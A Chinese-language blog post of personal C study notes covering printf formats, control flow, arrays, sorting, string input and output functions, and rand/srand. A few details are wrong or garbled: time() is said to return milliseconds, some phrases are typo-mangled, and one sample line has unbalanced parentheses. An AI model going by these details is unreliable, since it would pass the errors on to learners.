<h3 id="printf函数和putchar函数"><a href="#printf函数和putchar函数" class="headerlink" title="printf函数和putchar函数"></a>printf函数和putchar函数</h3><p>printf是输出一个字符串，putchar输出一个char</p>
<p>printf格式字符：</p>
<table>
<thead>
<tr>
<th>打印格式</th>
<th>对应数据类型</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>%d</td>
<td>int</td>
<td>接收整数值并将他表示为有符号的十进制整数</td>
</tr>
<tr>
<td>%hd</td>
<td>short int</td>
<td>短整数</td>
</tr>
<tr>
<td>%hu</td>
<td>unsigned short</td>
<td>无符号短整数</td>
</tr>
<tr>
<td>%o</td>
<td>unsigned int</td>
<td>无符号8进制整数</td>
</tr>
<tr>
<td>%u</td>
<td>unsigned int</td>
<td>无符号10进制整数</td>
</tr>
<tr>
<td>%x,%X</td>
<td>unsigned int</td>
<td>无符号16进制整数，x对应abcdef,X对应ABCDEF</td>
</tr>
<tr>
<td>%f</td>
<td>float</td>
<td>单精度浮点数</td>
</tr>
<tr>
<td>%lf</td>
<td>double</td>
<td>双精度浮点数</td>
</tr>
<tr>
<td>%e,%E</td>
<td>double</td>
<td>科学计数法表示的数，e的大小写代表输出是使用的E的大小写</td>
</tr>
<tr>
<td>%c</td>
<td>char</td>
<td>字符型。可以把输入的数字按照ASCII码相应转换为对应的字符</td>
</tr>
<tr>
<td>%s</td>
<td>char *</td>
<td>字符串。输出字符串中的字符直至字符串中的空字符 <br>（字符串以‘\0结尾，这个\0即空字符’）</td>
</tr>
<tr>
<td>%p</td>
<td>void *</td>
<td>以16进制形式输出指针</td>
</tr>
<tr>
<td>%%</td>
<td>%</td>
<td>输出一个百分号</td>
</tr>
</tbody></table>
<p><strong>printf附加格式：</strong></p>
<img src="/2023/12/15/c/image-20231205190810519.png" alt="image-20231205190810519" style="zoom:50%;">

<img src="/2023/12/15/c/image-20231205191222083.png" alt="image-20231205191222083" style="zoom:50%;">

<img src="/2023/12/15/c/image-20231205192818629.png" alt="image-20231205192818629" style="zoom:50%;">

<h3 id="运算符优先级别"><a href="#运算符优先级别" class="headerlink" title="运算符优先级别"></a>运算符优先级别</h3><img src="/2023/12/15/c/20231205200611.png" alt="20231205200611" style="zoom:50%;">

<h3 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h3><img src="/2023/12/15/c/image-20231205201220882.png" alt="image-20231205201220882" style="zoom:50%;">

<p>强制转换</p>
<p>格式：(数据类型)变量名;</p>
<p>类型转换原则：占用内存字节数少（值域小）的类型，向占用内存字节数多（值域大）的数据类型转换，以保证精度不降低。<br>从占用字节多的数据类型向占用字节数少的数据类型转换时，会降低精度：</p>
<img src="/2023/12/15/c/image-20231205202152032.png" alt="image-20231205202152032" style="zoom:67%;">

<h3 id="程序流程结构"><a href="#程序流程结构" class="headerlink" title="程序流程结构"></a>程序流程结构</h3><h4 id="1-分支结构"><a href="#1-分支结构" class="headerlink" title="1.分支结构"></a>1.分支结构</h4><h5 id="if结构"><a href="#if结构" class="headerlink" title="if结构"></a>if结构</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//表达式</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(consition2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//表达式</span></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//表达式</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">表达式1?表达式2:表达式3</span><br></pre></td></tr></table></figure>

<p><strong>如果表达式1为真，则用表达式2作为结果，为假用表达式3作为结果</strong></p>
<img src="/2023/12/15/c/image-20231205204226805.png" alt="image-20231205204226805" style="zoom:50%;">

<p>三目运算符的嵌套</p>
<img src="/2023/12/15/c/image-20231205204525348.png" alt="image-20231205204525348" style="zoom:50%;">

<p>使用#define宏定义表达式</p>
<img src="/2023/12/15/c/image-20231205205033609.png" alt="image-20231205205033609" style="zoom:50%;">

<h4 id="2-选择结构"><a href="#2-选择结构" class="headerlink" title="2.选择结构"></a>2.选择结构</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (switch_on)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> condition1:</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> condition2:</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-循环结构"><a href="#3-循环结构" class="headerlink" title="3.循环结构"></a>3.循环结构</h4><h5 id="while循环结构"><a href="#while循环结构" class="headerlink" title="while循环结构"></a>while循环结构</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(condition)&#123;</span><br><span class="line"><span class="comment">//执行语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">	<span class="comment">//执行语句</span></span><br><span class="line">&#125;<span class="keyword">while</span>(condition)</span><br></pre></td></tr></table></figure>

<p>do…while可以用于第一句执行条件为假，当第一句执行完后条件为真再进行后面循环的情况。</p>
<h5 id="for循环结构"><a href="#for循环结构" class="headerlink" title="for循环结构"></a>for循环结构</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; value; i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>for循环嵌套实例：时钟</em></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">60</span>; j++) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">60</span>; k++)</span><br><span class="line">			&#123;</span><br><span class="line">				system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%02d:%02d:%02d&quot;</span>,i,j,k);</span><br><span class="line">				Sleep(<span class="number">980</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>实例：九九乘法表</em></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d*%d=%d\t&quot;</span>, j, i, i * j);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-跳转语句"><a href="#4-跳转语句" class="headerlink" title="4.跳转语句"></a>4.跳转语句</h4><h5 id="break语句"><a href="#break语句" class="headerlink" title="break语句"></a>break语句</h5><p>1.在switch中，跳出case并结束switch<br>2.在循环中结束循环<br>3.在嵌套循环中，跳出最近循环</p>
<h5 id="continue语句"><a href="#continue语句" class="headerlink" title="continue语句"></a>continue语句</h5><p>结束本次循环，跳到下一次循环</p>
<p>如只输出偶数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="goto语句"><a href="#goto语句" class="headerlink" title="goto语句"></a>goto语句</h5><img src="/2023/12/15/c/image-20231206145941501.png" alt="image-20231206145941501" style="zoom:80%;">

<h3 id="六、数组与字符串"><a href="#六、数组与字符串" class="headerlink" title="六、数组与字符串"></a>六、数组与字符串</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>定义数组：数据类型 数组名[元素个数] &#x3D; {值1，值2，值3，……}；</p>
<p><strong>数组在内存中存储方式和大小</strong></p>
<p>数组存储在内存中连续的相同类型鹅变量空间。同一个数组所有的成员都是相同的数据类型，同时所有的成员在内存中的地址是连续的。因此可以通过地址找到数组的下一个</p>
<img src="/2023/12/15/c/image-20231206152557219.png" alt="image-20231206152557219" style="zoom:50%;">

<p><strong>数组名是一个地址常量	指向数组首地址的常量</strong></p>
<img src="/2023/12/15/c/image-20231206153111166.png" alt="image-20231206153111166" style="zoom:50%;">

<p><strong>数组占用内存的大小与数据个数和类型有关</strong></p>
<img src="/2023/12/15/c/image-20231206155931438.png" alt="image-20231206155931438" style="zoom:50%;">

<h4 id="数组逆置"><a href="#数组逆置" class="headerlink" title="数组逆置"></a>数组逆置</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> arr[] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> &#125;;</span><br><span class="line">	<span class="type">int</span> length = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> j = length - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (i &lt; j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> temp = arr[i];</span><br><span class="line">		arr[i] = arr[j];</span><br><span class="line">		arr[j] = temp;</span><br><span class="line"></span><br><span class="line">		i++;</span><br><span class="line">		j--;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; length; k++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,arr[k]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/12/15/c/image-20231206185958346.png" alt="image-20231206185958346" style="zoom:50%;">

<h5 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> arr[] = &#123; <span class="number">10</span>,<span class="number">56</span>,<span class="number">48</span>,<span class="number">79</span>,<span class="number">51</span>,<span class="number">46</span>,<span class="number">95</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">98</span> &#125;;</span><br><span class="line">	<span class="type">int</span> length = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length - <span class="number">1</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; length - <span class="number">1</span> - i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>])</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="type">int</span> temp = arr[j];</span><br><span class="line">			arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">			arr[j + <span class="number">1</span>] = temp;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h4><p><strong>判断二维数组行数和列数：</strong></p>
<img src="/2023/12/15/c/image-20231206192724601.png" alt="image-20231206192724601" style="zoom:50%;">

<p>** 打印二维数组 **</p>
<img src="/2023/12/15/c/image-20231206192958569.png" alt="image-20231206192958569" style="zoom:50%;">

<h4 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h4><h5 id="三维数组"><a href="#三维数组" class="headerlink" title="三维数组"></a>三维数组</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据类型 数组名[层][列][行]</span><br></pre></td></tr></table></figure>

<img src="/2023/12/15/c/image-20231206195845078.png" alt="image-20231206195845078" style="zoom:67%;">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6328)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> arr[<span class="number">2</span>][<span class="number">3</span>][<span class="number">4</span>] = &#123; <span class="comment">// 一个数组</span></span><br><span class="line">		&#123; <span class="comment">// 第一层</span></span><br><span class="line">			&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">			&#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;,</span><br><span class="line">			&#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123; <span class="comment">// 第二层</span></span><br><span class="line">			&#123;<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>&#125;,</span><br><span class="line">			&#123;<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>&#125;,</span><br><span class="line">			&#123;<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;三维数组大小：%d\n&quot;</span>, <span class="keyword">sizeof</span>(arr));									<span class="comment">//96</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;三维数组每层大小：%d\n&quot;</span>, <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]));							<span class="comment">//48</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;三维数组每层中每行大小：%d\n&quot;</span>, <span class="keyword">sizeof</span>(arr[<span class="number">0</span>][<span class="number">0</span>]));					<span class="comment">//16</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;三维数组每层每行中每个元素的大小：%d\n&quot;</span>, <span class="keyword">sizeof</span>(arr[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>]));		<span class="comment">//4</span></span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;层数：%d\n&quot;</span>, <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;行数：%d\n&quot;</span>, <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>][<span class="number">0</span>]));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;列数：%d\n&quot;</span>, <span class="keyword">sizeof</span>(arr[<span class="number">0</span>][<span class="number">0</span>]) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>]);;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h4><p>定义字符数组：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char 数组名[元素个数] = &#123;&#x27;h&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;o&#x27;&#125;;</span><br></pre></td></tr></table></figure>

<img src="/2023/12/15/c/image-20231206203151661.png" alt="image-20231206203151661" style="zoom:50%;">

<p>字符串最后一个字符为 \0，所以有6位。</p>
<p><strong>字符串拼接</strong></p>
<img src="/2023/12/15/c/image-20231206211934907.png" alt="image-20231206211934907" style="zoom:50%;">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6328)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> ch1[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	<span class="type">char</span> ch2[] = <span class="string">&quot;world&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> ch3[<span class="number">20</span>];</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> (ch1[i] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		ch3[i] = ch1[i];</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> (ch2[j] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		ch3[i + j] = ch2[j];</span><br><span class="line">		j++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	ch3[i + j] = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ch3);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><h5 id="字符串与字符的区别"><a href="#字符串与字符的区别" class="headerlink" title="字符串与字符的区别"></a>字符串与字符的区别</h5><p><strong>C语言中没有字符串这种数据类型，可以通过char的数组来替代：</strong><br>      	字符串一定是一个char的数组，但char的数组未必是字符串；<br>          数字0（和字符’\0’等价）结尾的char数组就是一个字符串，但如果char数组没有以数字0结尾，那么就不是一个字符串，只是普通字符数组，所以字符串是一种特殊的char的数组。</p>
<h5 id="字符串的输入与输出"><a href="#字符串的输入与输出" class="headerlink" title="字符串的输入与输出"></a>字符串的输入与输出</h5><h6 id="gets"><a href="#gets" class="headerlink" title="gets()"></a>gets()</h6><p><strong>1.功能：</strong>从标输入读入字符，并保到指定的内存间，直到出现换行符或读到文件结尾为止。</p>
<p><strong>2.gets(str)与scanf(“%s”,str)的区别：</strong><br>gets(str)允许输入的字符串含有空格<br>scanf(“%s”,str)不允许含有空格</p>
<p>但是scanf()可以通过正则表达式输入带空格的字符串：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%[^\n]&quot;</span>,  ch)</span><br></pre></td></tr></table></figure>

<p>意思是接收非回车以外的所有数值。</p>
<p><strong>注意：</strong>由于scanf()和gets()无法知道字符串s大小，必须遇到换行符或读到文件结尾为止才接收输入，因此容易导致字篮颗组画界（缓冲区溢出）的情况</p>
<h6 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h6><p><strong>1.功能：</strong>从stream指的文件内读入字符，保存轾到所指定的内存空间，直到出现换行字符、读到文件结尾或已读了size-1个字符为止，最后会自动加上字符’\0’作为序符束。</p>
<p>可以接受空格。</p>
<p><strong>2.参数：</strong></p>
<p>​		s：字符串<br>​		size：指定最大读取字符串的长度（size - 1）<br>​		stream：文件指针，如果读键盘输入的字符串，固定写为stdin</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> ch[<span class="number">10</span>];</span><br><span class="line">	fgets(ch, <span class="keyword">sizeof</span>(ch), <span class="built_in">stdin</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, ch);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="puts"><a href="#puts" class="headerlink" title="puts()"></a>puts()</h6><p><strong>功能：</strong>标准设备输出s字符串，在输出完成后自动输出一个’\n’</p>
<h6 id="fputs"><a href="#fputs" class="headerlink" title="fputs()"></a>fputs()</h6><p><strong>1.功能：</strong>将str所指定的字符串写入到stream指定的文件中，字符串结束符’\0’ 不写入文件。</p>
<p><strong>2.参数：</strong></p>
<p>​		str：字符串<br>​		stream：文件指针，如果把字符串输出到屏幕，固定写为stdout</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> ch[] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">	<span class="built_in">fputs</span>(ch, <span class="built_in">stdout</span>); <span class="comment">//等价于printf(&quot;%s&quot;, ch)</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="strlen"><a href="#strlen" class="headerlink" title="strlen()"></a>strlen()</h6><p><strong>1.功能：</strong>计算字符串长度（有效长度），计算的是第一个\0之前的长度，不包含\0</p>
<p><strong>2.返回值：</strong>返回值为unsigned int类型。</p>
<img src="/2023/12/15/c/image-20231206224553253.png" alt="image-20231206224553253" style="zoom:50%;">

<img src="/2023/12/15/c/image-20231206224718177.png" alt="image-20231206224718177" style="zoom:50%;">


<p>​																				↑↑↑↑↑↑↑		12，因为还有一个\0</p>
<p>使用strlen()函数要导入头文件 #include &lt;string.h&gt;</p>
<p>自己实现字符串长度计算</p>
<img src="/2023/12/15/c/image-20231206225332152.png" alt="image-20231206225332152" style="zoom:50%;">

<p>strlen()</p>
<img src="/2023/12/15/c/image-20231206225420024.png" alt="image-20231206225420024" style="zoom:50%;">

<h3 id="七、函数"><a href="#七、函数" class="headerlink" title="七、函数"></a>七、函数</h3><h5 id="函数调用：产生随机数"><a href="#函数调用：产生随机数" class="headerlink" title="函数调用：产生随机数"></a>函数调用：产生随机数</h5><p>当调用函数时，需要关心5要素：</p>
<p>头文件：包含指定的头文件<br>函数名字：函数名字必须和头文件声明的名字一样<br>功能：需要知道此函数能干啥后才调用。<br>参数：参数类型要匹配<br>返回值：根据需要接收返回值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">time_t</span> <span class="title function_">time</span><span class="params">(<span class="type">time_t</span>*t)</span>;</span><br><span class="line"></span><br><span class="line">功能：获取当前系统时间</span><br><span class="line">参数：常设置为<span class="literal">NULL</span></span><br><span class="line">返回值：当前系统时间<span class="type">time_t</span>相当于<span class="type">long</span>类型，单位为毫秒</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">srand</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> seed)</span>;</span><br><span class="line"></span><br><span class="line">功能：用来设置rand()产生随机数时的随机种子</span><br><span class="line">参数：如果每次设置的seed相等，rand()产生随机数相等</span><br><span class="line">返回值：无</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">rand</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line">功能：返回一个随机数值</span><br><span class="line">参数：无</span><br><span class="line">返回值：随机数</span><br></pre></td></tr></table></figure>

<p><strong>直接产生的随机数</strong></p>
<img src="/2023/12/15/c/image-20231206231811470.png" alt="image-20231206231811470" style="zoom:67%;">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 添加随机数种子</span></span><br><span class="line">	srand((<span class="type">size_t</span>)time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, rand() % <span class="number">100</span>); <span class="comment">// 产生0~99之间的随机数</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成特定范围的随机数</p>
<img src="/2023/12/15/c/image-20231207135553294.png" alt="image-20231207135553294" style="zoom:50%;">

<img src="/2023/12/15/c/image-20231207135640611.png" alt="image-20231207135640611" style="zoom:50%;">

<p>双色球案例：注意去重</p>
